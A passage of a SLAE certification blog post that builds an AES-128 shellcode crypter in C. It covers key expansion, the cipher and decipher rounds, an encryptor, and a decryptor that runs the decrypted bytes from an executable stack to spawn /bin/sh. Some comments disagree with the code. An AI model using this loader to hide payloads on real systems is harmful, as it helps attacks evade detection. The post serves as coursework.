									  &nbsp;In <i>g()</i>, call <i>RotWord(temp)</i> and <i>SubWord(temp)</i> in order then XOR with the round constant mapped by <i>Rcon[i/4]</i>. &nbsp;Rcon is an array
									  of round constants expresssed as "the exponentiation of 2 to a user-specified value" over a finite field
									  (<a href="https://cryptography.fandom.com/wiki/Rijndael_key_schedule" target="_blank" style="color:blue;">source</a>). &nbsp;Its definition can
									  be copied from the source but only the first 11 values are needed. &nbsp;Below is the AES-128 implementation of <i>ExpandKey()</i>. &nbsp;Further
									  changes must be made if working with AES-256 such as 60 words, up to 32 bytes of user provided key in the first eight words, and implementing key
									  padding standards should the input key not be 32 bytes long.
									</p>

									<pre>
										<code class="c-like" style=display:block;white-space:pre-wrap>
const uint8_t Rcon[16] = {0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 0xab, 0x4d, 0x9a};

// Cipher transformation that takes all of the columns of the state and mixes their data to produce new columns
// Algorithm source: `brainkart.com/article/AES-Key-Expansion_8410/`
void ExpandKey(uint8_t key[4][4], uint8_t word[44][4]){

    int i, j, k;
    uint8_t temp[4];

    // First 4 words of expanded key are just the key copied
    for (i = 0; i&lt;4; ++i) {
        for (j=0; j&lt;4; j++) {
            word[j][i] ^= key[i][j];
        }
    }

    // Handle remaining words of key expansion
    for (i = 4; i&lt;44; i++) {
        for (j = 0; j&lt;4; j++) {
            // Copy previous word into temporary location
            temp[j] = word[i - 1][j];
        }

        // for every fourth word, execute g(word[]) operation
        if (i % 4 == 0) {
            RotWord(temp);
            SubWord(temp);
            temp[0] ^= Rcon[i/4];
        }

        // At i = 4, w[4] = w[0] ^ g(w[3])
        for (k=0; k&lt;4; k++){
            // word[4][k] = word[0][k] XOR temp[k]
            word[i][k] = word[i - 4][k] ^ temp[k];
        }
    } // end i

} // end ExpandKey()
										</code>
									</pre>

									<p>
									Compile and run using the <a href="https://kavaliro.com/wp-content/uploads/2014/03/AES.pdf" target="_blank" style="color:blue;">test case</a> on
									pages 2 and 3. &nbsp;Test output is much too long to display but values match results on page 3.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/20-keyexpansion-demo.png" alt="" /></div></center><br>



			<br><section id="Cipher"><h2>Cipher Repetitions</h2></section>

									<p>
										&emsp; &emsp;Return to the <a href="https://thestunneddefense.com/pages/custom-crypter.html#Outline" target="_blank" style="color:blue;">system outline</a>
										 once all subfunctions have been written and tested. &nbsp;Encryption and decryption functions must occur in an iterated fashion according to the
										 outline. &nbsp;Furthermore, all rounds happen on 16 byte blocks of data at a time. &nbsp;This means another function is required to implement encryption
										 rounds for every 16 bytes of data that gets encrypted.<br>
										 &emsp; &emsp;Before any encryption rounds happen, <i>AddRoundKey()</i> is called with the first four words of the key schedule. &nbsp;Then functions
										 <i>SubBytes()</i>, <i>ShiftRows()</i>, <i>MixColumns()</i>, and <i>AddRoundKey()</i> are called in a row nine times. &nbsp;The tenth round omits
										 <i>MixColumns()</i>. &nbsp;Since the program operates over bytes instead of words, the correct 4 words must be loaded for use in <i>AddRoundKey()</i> with
										 a nested for-loop. &nbsp;Use a block size constant, <i>Nb</i>, to help calculate the key schedule offset by looping over <i>Nb</i> bytes at a time. &nbsp;The
										 last key is easy. &nbsp;Simply load the final four words starting at index 40. &nbsp;Below is the resultant code.
									</p>
									<pre>
										<code class="c-like" style=display:block;white-space:pre-wrap>
// block size
#define NB 4

// Main cipher function that calls sub-functions in order: SubBytes(), ShiftRows(), MixColumns(), and AddRoundKey()
// RoundKey is produced in the key expansion function, ExpandKey(),
void Cipher(uint8_t state[4][NB], uint8_t keySchedule[44][NB]){
    /*
        Cipher function performs the actual encryption operations on 16-byte blocks
        of plaintext and keys.

        plaintext matrix is already set (from state[][]) but Key Expansion must take
        place in ExpandKey(). Round keys are loaded into inputKey[4][4] one round at a time.
    */

    // Load first 4 words of keySchedule[][] for use with AddRoundKey()
    uint8_t inputKey[4][4] = { 0 };
    int a, b;
    for (a = 0; a&lt;4; a++) {
        for (b = 0; b&lt;4; b++) {
            inputKey[b][a] = keySchedule[a][b];
        }
    }

	// Call first instance of AddRoundKey() before continuing with normal rounds
	AddRoundKey(state, inputKey);

    // Perform encryption rounds
    // Call SubBytes(), ShiftRows(), MixColumns(), and AddRoundKey() 13 times
    for (int i = 1; i &lt; NR; i++) {

        SubBytes(state);
        ShiftRows(state);
        MixColumns(state);

        // Load round key from keySchedule for use in AddRoundKey
        int row, col;
        for (row = i*NB; row&lt;(i*NB)+4; row++) {
            for (col = 0; col&lt;4; col++) {
                inputKey[col][row - (i*NB)] = keySchedule[row][col];
            }
        }

            // This index should be a multiple of 4 increasing from 4 up to 40
            AddRoundKey(state, inputKey);

    } // end round iterations loop

    // Omit MixColumns() for final round; else proceed with SubBytes(),
    // ShiftRows(), and AddRoundKey() in order
    SubBytes(state);
    ShiftRows(state);

    // Load last 4 words from keySchedule for final AddRoundKey
    int c, d;
    for (c = 40; c&lt;44; c++) {
        for (d = 0; d&lt;4; d++) {
            inputKey[d][c-40] = keySchedule[c][d];
        }
    }
    // 40 is the starting index of last 4 words: 40, 41, 42, 43
    AddRoundKey(state, inputKey);

    return;
} // end Cipher function
										</code>
									</pre>

									<p>
										Compile and run using the complete <a href="https://kavaliro.com/wp-content/uploads/2014/03/AES.pdf" target="_blank" style="color:blue;">test case</a> to
										get the ciphertext on page 17.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/21-cipher-demo.png" alt="" /></div></center><br>

									<p>
										A similar routine is done for decryption except the order is slightly different during the rounds: <i>InvShiftRows()</i>, <i>InvSubBytes()</i>,
										<i>AddRoundKey()</i>, and <i>InvMixColumns()</i>. &nbsp;<i>InvMixColumns()</i> is omitted from the final round and <i>AddRoundKey()</i> is executed
										before executing decryption rounds. &nbsp;Note that the first <i>AddRoundKey()</i> uses the last four words of the key schedule and round ten
										<i>AddRoundKey()</i> uses the first four words of the key schedule. &nbsp;So <i>Decrypt()</i> should look very similar to <i>Cipher()</i>. &nbsp;Below
										is the final function code.
									</p>
									<pre>
										<code class="c-like" style=display:block;white-space:pre-wrap>
// block size
#define NB 4

// Main decryption function that calls sub-functions in order: InvShiftRows(), InvSubBytes(),
// AddRoundKey(), and InvMixColumns() while omitting InvMixColumns() in the final round
// keySchedule is produced in the key expansion function: ExpandKey()
void Decrypt(uint8_t state[4][NB], uint8_t keySchedule[44][NB]){
    /*
        Decrypt function performs the actual decryption operations on 16-byte blocks
        of plaintext and keys.

        ciphertext matrix is already set (from state[][]) but Key Expansion must take
        place in ExpandKey(). Round keys are loaded into inputKey[4][4] one round at a time.
    */

    // Load keySchedule for initial AddRoundKey() starting from the last 4 words
    uint8_t inputKey[4][4] = { 0 };
    int c, d;
    for (c = 40; c&lt; 44; c++) {
        for (d = 0; d&lt;4; d++) {
            inputKey[d][c-40] = keySchedule[c][d];
        }
    }

    // Pass round key and input state into AddRoundKey() before start of normal rounds
    AddRoundKey(state, inputKey);

    // Do InvShiftRows(), InvSubBytes(), AddRoundKey(), and InvMixColumns() in a row
    // 9 times starting from the back of key schedule (from i = 9 to 1)
    for (int i = NR-1; i >= 1; i--) {

        InvShiftRows(state);
        InvSubBytes(state);

        // Load keySchedule for use in AddRoundKey()
        // This index should be a multiple of 4 decreasing from 36 down to 4
        int row, col;
        // i starts from 9 down to 1; NB = 4; 9*4 = 36; last inputKey group is w[4]-w[7]
        for (row = i*NB; row &lt;(i*NB)+4; row++) {
            for (col = 0; col&lt;4; col++) {
                inputKey[col][row - (i*NB)] = keySchedule[row][col];
            }
        }

        AddRoundKey(state, inputKey);
        InvMixColumns(state);

    } // end round iterations loop

    // Omit InvMixColumns() for final round. Proceed with InvShiftRows(), InvSubBytes(), and AddRoundKey()
    InvShiftRows(state);
    InvSubBytes(state);

    // Load first 4 words of keySchedule[][] per 'Ch06 Crypto7e.pdf' pg. 7
    for (int a = 0; a&lt;4; a++) {
        for (int b = 0; b&lt;4; b++) {
            inputKey[b][a] = keySchedule[a][b];
        }
    }

    // 0 is starting index of last 4 words: 0, 1, 2, 3
    AddRoundKey(state, inputKey);

    return;
}
										</code>
									</pre>

									<p>
										Compile and run the decryption routine using the previous
										<a href="https://kavaliro.com/wp-content/uploads/2014/03/AES.pdf" target="_blank" style="color:blue;">test case</a> but
										going backwards. &nbsp;If more debugging is required, use the test case from
										<a href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf" target="_blank" style="color:blue;">FIPS 197</a> on page
										 36. &nbsp;The advantage of this test case is all intermediate state values are shown making fault isolation easier.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/22-decrypt-demo.png" alt="" /></div></center><br>




			<br><section id="Integration"><h2>Integration and Demonstration</h2></section>

									<p>
									&emsp; &emsp;Now that primary encryption and decryption functions work on single states, alter the main function code to handle multiple blocks of
									plaintext (unencrypted shellcode bytes). &nbsp;There needs to be a method to load plaintext bytes into the state matrix for processing. &nbsp;The same
									needs to be done for the user provided key. &nbsp;Furthermore, what happens when the plaintext is not a multiple of 16 bytes? &nbsp;This is
									where padding is used. &nbsp;If the plaintext is not a multiple of 16 bytes, create a separate implementation that will pad the remaining state matrix
									once all plaintext bytes are used. &nbsp;This will only happen on the final state matrix. &nbsp;For example, a plaintext of 30 bytes requires only
									 two bytes of padding to fill the last state. &nbsp;Such an implementation requires a for-loop to fill the state matrix normally while checking the
									 number of bytes already loaded. &nbsp;Traversing over plaintext bytes requires an index initialized to zero (<code>shell_index = 0</code>) and incremented after each
									 successfully loaded byte. &nbsp;Another index must be initialized to traverse the key bytes as well (<code>key_index = 0</code>). &nbsp;All plaintext bytes
									 have been loaded into state matrices once the tracked
									 <code>shell_index</code> exceeds <code>shellcode_len</code>, so fill the rest of the state matrix with the padded byte, 0x0f. <br>
									 &emsp; &emsp;Another question must be answered: how many times does the encryption/decryption loop iterate? &nbsp;The answer depends on the length of the
									 plaintext (<code>shellcode_len</code>). &nbsp;<i>Cipher()</i> is called every 16 bytes, which means an integer division must occur to get the number of
									  full 16 byte blocks to encrypt (no padding). &nbsp;This value is calculated in the expression <code>rounds = shellcode_len / 16</code>. &nbsp;If the
									  plaintext length is cleanly divisible by 16, an extra loop is not needed for padding. &nbsp;However if it is not divisible by 16, the final round must
									  be included in the for-loop; hence the line:<br>
									   <code>for (iterations = 0; iterations <b>&lt;=</b> rounds; iterations++)</code> instead of using a <code>&lt;</code> sign.<br>
									   &emsp; &emsp;Since the encryption function returns encrypted shellcode bytes, iterate over the state matrix to print encrypted shellcode bytes after
									   calling <i>Cipher()</i>. &nbsp;The key can be embedded in the program or handled as a parameter with <code>int argc, char **argv</code>. &nbsp;Either way
									   there must be a method for the program to retrieve it. &nbsp;Below is the main function for encryption.


									</p>
									<pre>
										<code class="c-like" style=display:block;white-space:pre-wrap>
int main(int argc, char **argv) {
    /*
    Main function divides plaintext and keys into 16-byte blocks for operation by
    Cipher() function
    */
    unsigned char *encryption_key;
    int encryption_key_length;
    int shellcode_len = strlen(shellcode);

    // Extract key parameter and get its length
    encryption_key = (unsigned char *)argv[1];
    encryption_key_length = strlen((char *)encryption_key);

    if (encryption_key_length < 16) {
        printf("Key too small. Should be minimum 16 characters\n");
        exit(-1);
    }

    // Number of full rounds.  "Full" means 16 bytes of state[4][4] are filled
    // with shellcode bytes and not padding.
    int rounds = shellcode_len / 16;

    // Index counters to traverse shellcode and encryption_key bytes. These are
    // initialized to zero and set outside the loop
    int shell_index = 0;
    int key_index = 0;
    // master loop counter
    int iterations;

    // Initialize state and key matrices
    uint8_t state[4][4] = { 0 };
    uint8_t key[4][4] = { 0 };


    // Load key values from input encryption_key
    for (int b = 0; b&lt;4; b++){
        for (int a = 0; a&lt;4; a++){
            key[a][b] = encryption_key[key_index];
            key_index += 1;
        }
    }

    // Expand the 4x4 key
    uint8_t key_expanded[44][4] = { 0 };
    ExpandKey(key, key_expanded);

    printf("Dumping AES-128 Encrypted Shellcode\n\n\n\"");
    // MASTER LOOP
    // Load groups of 16 bytes of shellcode into state[4][4]
    if (shellcode_len % 16 == 0) {
        // if shellcode is a multiple of 16 do NOT perform the extra encryption round full of
        // padded bytes
        for (iterations = 0; iterations < rounds; iterations++){

            // Execute byte loading instructions for state
            int i, j;
            for (j = 0; j&lt;4; j++){
                for (i = 0; i&lt;4; i++){
                    if (shell_index &lt; shellcode_len) {
                        // end of shellcode not reached. Store shellcode bytes normally.
                        state[i][j] = shellcode[shell_index];
                    }
                    else {
                        // Pad rest of matrix with 0x0f if end of shellcode reached.
                        state[i][j] = 0x0f;
                    }
                    shell_index += 1;
                }
            }

            // Execute Cipher with loaded state matrix
            // Pass state and expanded key into cipher function over number of iterations
            Cipher(state, key_expanded);

            for (int c = 0; c&lt;4; c++){
                for (int d = 0; d&lt;4; d++){
                    printf("\\x%02x", state[d][c]);
                }
            }
        } // end iterations loop
    } // end shellcode_len modulo check
    // else perform normal encryption routine
    else {
        for (iterations = 0; iterations <= rounds; iterations++){

            // Execute byte loading instructions for state
            int i, j;
            for (j = 0; j&lt;4; j++){
                for (i = 0; i&lt;4; i++){
                    if (shell_index &lt; shellcode_len) {
                        // end of shellcode not reached. Store shellcode bytes normally.
                        state[i][j] = shellcode[shell_index];
                    }
                    else {
                        // Pad rest of matrix with 0x0f if end of shellcode reached.
                        state[i][j] = 0x0f;
                    }
                    shell_index += 1;
                } // end i
            } // end j

            // Execute Cipher with loaded state matrix
            // Pass state and expanded key into cipher function over number of iterations
            Cipher(state, key_expanded);

            for (int c = 0; c&lt;4; c++){
                for (int d = 0; d&lt;4; d++){
                    printf("\\x%02x", state[d][c]);
                }
            }
        } // end iterations routine
    }  // End MASTER LOOP

    // end shellcode with double quote
    printf("\"\n\n");
    return 1;

}
										</code>
									</pre>

									<p>
										Integrate the above code with all other dependant functions previously covered into a source file to compile. &nbsp;Shellcode from
										<i>execve-stack.nasm</i> was encrypted with the key "<i>lookatthedefensetim</i>" to produce its encrypted form below. &nbsp;This
										encrypted payload is the input parameter to the decryptor.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/23-encryptor-demo.png" alt="" /></div></center><br>

									<p>
										The decryption main function should look quite similar to encryption above with a couple of additions. &nbsp;Because this program is
										passing execution control to a memory location and not printing anything to stdout, a "no-no" function must be defined for the destination where
										decrypted shellcode will go: into <code>ciphertext</code>. &nbsp;This memory location does not hold anything (yet), but will be filled with decrypted bytes as state
										matrices are passed through the <i>Decrypt()</i> function; therefore, an additional index (<code>counter</code>) must be initialized and
										used to index decrypted bytes for storage in <code>ciphertext</code>. &nbsp;An additional if-statement is added inside the for-loops to ensure
										decryption stops after all encrypted bytes are processed. &nbsp;Since the encrypted shellcode is a multiple of 16 bytes, it will not
										reach the outer else-statement. &nbsp;Finally, call the "no-no" function <code>ret();</code>.
									</p>
									<pre>
										<code class="c-like" style=display:block;white-space:pre-wrap>
int main(int argc, char **argv) {
    /*
    Main function needs to divide plaintext and keys into 16-byte blocks for operation by
    Decrypt() function
    */

    unsigned char *encryption_key;
    int encryption_key_length;
    int shellcode_len = strlen(encrypted_shellcode);
    int counter = 0;

    // ciphertext[] is statically allocated in this instance. Can be changed using malloc()
    unsigned char ciphertext[100] = {0};
    // no-no function
    int (*ret)() = (int(*)())ciphertext;

    // Extract key parameter and get its length
    encryption_key = (unsigned char *)argv[1];
    encryption_key_length = strlen((char *)encryption_key);

    if (encryption_key_length &lt; 16) {
        printf("Key too small. Should be minimum 16 characters\n");
        exit(-1);
    }


    // Number of full rounds.  Full meaning all 16 bytes of state[4][4] are filled
    // with shellcode bytes and not padding.
    int rounds = shellcode_len / 16;

    // Index counters to traverse shellcode and key bytes. This is initialized to
    // zero and set outside the loop
    int shell_index = 0;
    int key_index = 0;
    // master loop counter
    int iterations;

    // Initialize state and key matrices
    uint8_t state[4][4] = { 0 };
    uint8_t key[4][4] = { 0 };

    // Load key values from input encryption_key
    for (int b = 0; b&lt;4; b++){
        for (int a = 0; a&lt;4; a++){
            key[a][b] = encryption_key[key_index];
            key_index += 1;
        }
    }

    // Expand the 4x4 key to AES-128 specified size
    uint8_t key_expanded[44][4] = { 0 };
    ExpandKey(key, key_expanded);

    printf("Decrypting AES-128 Encrypted Shellcode.....\n\n\n");
    // MASTER LOOP
    // Load groups of 16 bytes of shellcode into state[4][4]
    if (shellcode_len % 16 == 0) {

        // if shellcode is a multiple of 16 do NOT perform the extra encryption round full of
        // padded bytes; hence the '&lt;' operator.
        for (iterations = 0; iterations &lt; rounds; iterations++){

            // break loop once end of shellcode is reached
            if (shell_index == shellcode_len) {
                break;
            }

            // Load encrypted bytes into state[][]
            int i, j;
            for (j = 0; j&lt;4; j++){
                for (i = 0; i&lt;4; i++){

                    // Continue loading bytes into state[][] if end of encrypted shellcode not reached
                    if (shell_index &lt; shellcode_len) {
                        // end of shellcode not reached. Store shellcode bytes normally.
                        state[i][j] = encrypted_shellcode[shell_index];
                        shell_index += 1;
                    }
                } // end i
            } // end j

            // Execute Decrypt() with loaded state matrix
            // Pass state and expanded key into Decrypt() function over number of iterations
            Decrypt(state, key_expanded);

            // Next step is to place state[d][c] bytes into ciphertext[] using counter as an index
            for (int c = 0; c&lt;4; c++){
                for (int d = 0; d&lt;4; d++){
                    ciphertext[counter] = state[d][c];
                    counter+= 1;
                }
            }
        } // end iterations loop

        // Force NULL byte placement at the very end of decrypted shellcode
        ciphertext[counter] = 0x00;

    } // end shellcode_len modulo check
    // else perform normal routine that includes final round
    else {
            // Shellcode is padded and encrypted 16 bytes at a time so this block
            // should not be reached......
            for (iterations = 0; iterations <= rounds; iterations++){

                // break loop once end of shellcode is reached
                if (shell_index == shellcode_len) {
                	break;
                }

                // Load encrypted bytes into state[][]
                int i, j;
                for (j = 0; j&lt;4; j++){
                    for (i = 0; i&lt;4; i++){
                        if (shell_index &lt; shellcode_len) {
                            // end of shellcode not reached. Store shellcode bytes normally.
                            state[i][j] = encrypted_shellcode[shell_index];
                            shell_index += 1;
                        }
                    } // end i
                } // end j

                // Execute Decrypt() with loaded state matrix
                // Pass state and expanded key into Decrypt() function over number of iterations
                Decrypt(state, key_expanded);

                // Next step is to place state[d][c] bytes into ciphertext[] using counter as an index
                for (int c = 0; c&lt;4; c++){
                    for (int d = 0; d&lt;4; d++){
                        ciphertext[counter] = state[d][c];
                        counter+= 1;
                    }
                }
            } // end iterations loop
    }  // End MASTER LOOP

    printf("\n\n");
    // call no-no function
    ret();

    return 1;

}
										</code>
									</pre>

									<p>
										The final test case is a demonstration of the overall project and must be conducted on a 32-bit Linux machine since
										the shellcode is written to target that architecture. &nbsp;As with all previous blog posts, compile the decryptor
										with no stack protection and executable stack flags set. &nbsp;Run the decryptor with the same key and cry tears of
										joy! &nbsp;\o/
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/24-decryptor-demo.png" alt="" /></div></center><br>

									<p>
										Now that basic functionality works for decrypting <i>execve-stack.nasm</i> shellcode, grab the decoder payload
										(starts with "\xeb\x33\x5e....") from the
										<a href="https://thestunneddefense.com/pages/custom-encoding.html" target="_blank" style="color:blue;">custom encoder</a>
										blog post and paste it into the encryptor. &nbsp;Encrypt with the same secret key. &nbsp;Enure there are no spaces when
										 making a double line string as this will create an inaccurate encryption!
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/25-encrypt-decoder.png" alt="" /></div></center><br>

									<p>
										Assign the encrypted shellcode to the appropriate variable in decryptor. &nbsp;Run the decryptor once again with the same
										secret key and watch it unravel into a /bin/sh shell!
									</p>
									<center><div class="image post"><img src="../images/slae/assignment7/26-decrypt-decoder.png" alt="" /></div></center><br>



		<br><section id="Thoughts"><h2>Thoughts and Lessons Learned</h2></section>

									<p>
										&emsp; &emsp;This concludes everything involving shellcode encryption/decryption as well as the final SLAE assignment. &nbsp;The
										assignment presented a fantastic opportunity for low-level development on a larger scale. &nbsp;From here, the only improvements
										needed could be integrating 192 and 256 versions of AES including further refinement of key expansion. &nbsp;Things get more
										sophisticated and confusing when introducing more obfuscation and scrambling methods. &nbsp;Since there are no more SLAE assignments
										for follow up, Pentester Academy's Certified Red Team Professional (CRTP) content will likely be next. &nbsp;Until next time Tim!
									</p>


									<p>
										The source code for this assignment as well as other SLAE assignments is here:
										<a href="https://github.com/jpc0016/SLAE-code" target="_blank" style="color:blue;">https://github.com/jpc0016/SLAE-code</a>
									</p>

									<p>
									This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
									<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank" style="color:blue;">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><br>

									Student ID: PA-15981
									</p>


                        </div>

                      </article>
                    </body>
                  </section>








									<!--
									End post body
									-->

									<!--
									NEW POSTS GO ABOVE THIS LINE
									-->






									<!-- Remove Pagination
							<div class="pagination"><a href="#"> 1 </a></div>
							<div class="pagination"><a href="#"> 2 </a></div>
							<div class="pagination"><a href="#"> 3 </a></div>
							<div class="pagination"><a href="#"> 4 </a></div>
							<div class="pagination"><a href="#"> 5 </a></div>-->
							</div>
					</div>

				<!-- Footer -->
					<footer id="footer">

						<section class="split contact">

							<section>
								<h3>Social</h3>
								<ul class="icons alt">
									<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>
									<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
									<li><a href="https://twitter.com/JohnGuy_01" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
									<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
								</ul>
							</section>
						</section>
					</footer>

				<!-- Copyright -->
					<div id="copyright">
						<ul><li>&copy; Untitled</li><li>Design: <a href="https://html5up.net" target="_blank">HTML5 UP</a></li></ul>
					</div>

			</div>

		<!-- Scripts -->
			<script src="assets/js/jquery.min.js"></script>
			<script src="assets/js/jquery.scrollex.min.js"></script>
			<script src="assets/js/jquery.scrolly.min.js"></script>
			<script src="assets/js/browser.min.js"></script>
			<script src="assets/js/breakpoints.min.js"></script>
			<script src="assets/js/util.js"></script>
			<script src="assets/js/main.js"></script>

	</body>
</html>
